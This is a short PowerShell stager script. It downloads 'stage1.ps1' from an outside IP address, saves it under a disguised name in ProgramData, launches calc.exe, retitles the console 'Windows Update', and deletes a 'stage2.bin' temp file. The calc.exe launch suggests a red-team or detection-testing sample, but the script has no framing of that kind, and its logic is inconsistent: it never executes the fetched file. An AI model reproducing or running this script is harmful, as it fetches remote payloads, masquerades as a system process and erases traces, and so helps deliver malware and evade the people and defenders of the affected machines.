
<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'http://198.51.100.233:8080/stage1.ps1',
    [string]$PayloadPath = "C:\ProgramData\svcupdate.exe",
    [int]$TransferTimeout = 67
)
Start-BitsTransfer -Source $FetchUrl -Destination $PayloadPath -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$Host.UI.RawUI.WindowTitle = "Windows Update"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
